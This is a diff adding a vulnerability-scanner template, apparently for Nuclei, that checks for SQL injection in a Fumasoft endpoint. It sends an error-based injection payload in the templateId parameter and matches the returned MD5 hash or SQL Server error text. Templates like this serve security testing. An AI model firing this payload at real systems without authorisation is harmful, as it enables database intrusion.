@@ -1,0 +1,35 @@
+id: fumasoft-sendmail-sqli
+info:
+  name: Fumasoft SendMail SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1+and+1%3Csys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "\"message\":"
+        condition: and
+      - type: word
+        words:
+          - "<html"
+        negative: true
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
